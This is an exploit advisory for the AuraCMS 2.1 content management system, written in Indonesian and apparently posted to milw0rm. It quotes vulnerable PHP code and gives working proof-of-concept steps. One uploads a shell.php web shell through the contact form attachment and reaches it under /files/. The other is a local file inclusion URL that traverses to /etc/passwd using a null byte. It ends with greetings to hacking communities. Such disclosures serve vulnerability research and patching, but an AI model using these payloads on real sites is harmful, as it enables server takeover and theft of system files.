@@ -1,0 +1,179 @@
+########################################################################
+# AuraCMS 2.1 - Remote File Attachment - Local File Inclusion
+# Vendor           : http://www.auracms.org/
+# Download        : http://www.auracms.org/dl_jump.php?id=42
+# Ditemukan oleh   : k1tk4t - k1tk4t[4t]newhack.org
+# Lokasi           : Indonesia  --  #newhack[dot]org @ irc.dal.net
+########################################################################
+====================================
+Remote File Attachment Vulnerability
+====================================
+
+//berkas pada '/mod/contak.php'
+---------------- Baris-41 --------------------
+if ($_POST['submit']) {
+
+
+    $nama = text_filter($_POST['nama']);
+   
+    $email = text_filter($_POST['email']);
+
+    $pesan = nl2br(text_filter($_POST['pesan'], 2));
+
+    $images = text_filter($_POST['image']);
+
+
+
+    checkemail($email);
+
+    $gfx_check = intval($_POST['gfx_check']);
+
+        if (!$nama)  $error .= "Error: Please enter your name!<br />";
+
+        if (!$pesan) $error .= "Error: Please enter a message!<br />";
+
+
+
+        $code = substr(hexdec(md5("".date("F j")."".$_POST['random_num']."".$sitekey."")), 2, 6);
+
+    if (extension_loaded("gd") AND $code != $_POST['gfx_check']) $error .= "Error: Security Code Invalid<br />";
+
+
+
+    if ($error) {
+
+        $tengah.='<table width="100%" border="0" cellspacing="0" cellpadding="0" class="middle"><tr><td><table width="100%" class="bodyline"><tr><td align="left"><img src="images/warning.gif" border="0"></td><td align="center"><font class="option">'.$error.'</font></td><td align="right"><img src="images/warning.gif" border="0"></td></tr></table></td></tr></table>';
+
+    } else {
+
+
+
+    if (!empty ($image_name)){
+
+    $image_name = $_FILES['image']['name'];
+
+    $image_temp = $_FILES['image']['tmp_name'];
+
+    $tempat = "files/";
+
+
+
+    @copy($_FILES[image][tmp_name], "./files/".$image_name);
+
+    if(@copy($_FILES[image][tmp_name], "./files/".$image_name)){
+
+        unlink($image);
+
+        $sukses = "Sukses Upload File ".$image_name;
+
+    }else{
+
+        $sukses = "Gagal Upload File ".$image_name;
+
+---------------- Baris-61 --------------------
+
+pemfilteran "$images" tidak sempurna, sehingga pengguna dapat mengupload/attachment file yang tidak diinginkan kedalam direktori /files/.
+
+//POC;
+
+http://localhost/auracms2.1/index.php?pilih=../mod/contak
+
+atau
+
+http://localhost/auracms2.1/index.php?pilih=contak&mod=yes
+
+isi semua konten isian, masukan angka 'security code' dengan benar, "Attachment" --> shell.php ;
+
+http://localhost/auracms2.1/files/shell.php
+
+
+
+===================================
+Local File Inclusion Vulnerability
+===================================
+
+//berkas pada '/index.php' - AuraCMS versi 2.x
+
+--------- baris-24 ----------
+if (isset ($_GET['mod'])) $mod = $_GET['mod'] ; else $mod = '';
+
+
+
+
+if(!isset($_GET['pilih'])){
+
+include 'content/normal.php';
+
+}else {
+
+
+
+
+if($mod == "yes" && file_exists("mod/$_GET[pilih].php")){
+
+include "mod/$_GET[pilih].php";
+
+ } else {
+
+
+
+if (eregi('http://', $_GET['pilih']) or !file_exists("content/$_GET[pilih].php") or $_GET['pilih'] == 'index'){
+
+$_GET['pilih'] = 'normal';
+--------- baris-39 ----------
+
+
+//berkas pada '/index.php' - AuraCMS versi 1.x
+
+--------- baris-13 ----------
+<?
+if(!isset($pilih))$pilih='';
+switch($pilih){
+     case '':
+       include "normal.php";
+       break;
+     default:
+       if($mod == "yes" && file_exists("mod/$pilih.php")){
+           
+        include "mod/$pilih.php";
+       } else {
+           if (eregi('http://', $pilih) or !file_exists("$pilih.php")){
+               $pilih = 'normal';
+           }
+               include "$pilih.php";
+       }
+       break;
+}
+?>
+--------- baris-33 ----------
+
+need magic_quotes_gpc = off ,
+jika magic_quotes_gpc = off maka pengguna dapat memanipulasi $pilih
+
+//POC;
+
+http://localhost/auracms.x.x/index.php?pilih=../../../../../../../etc/passwd%00
+
+########################################################################
+Terimakasih untuk;
+str0ke, DNX
+xoron,iFX,x-ace,nyubi,arioo,selikoer,k1n9k0ng,aldy_BT,adhietslank
+dan semua temen2 komunitas security&hacking
+-----------------------
+-newhack[dot]org|staff-
+mR.opt1lc ,fusion,fl3xu5,PusHm0v,Ghoz,bius,iind_id,slackX
+-----------------------
+all member newhack[dot]org
+-----------------------
+all member www.echo.or.id
+-----------------------
+all member www.yogyafree.net
+-----------------------
+all member www.sekuritionline.net
+-----------------------
+all member www.kecoak-elektronik.net
+-----------------------
+semua komunitas hacker&security Indonesia
+Cintailah Bahasa Indonesia
+
+# milw0rm.com [2007-09-10]
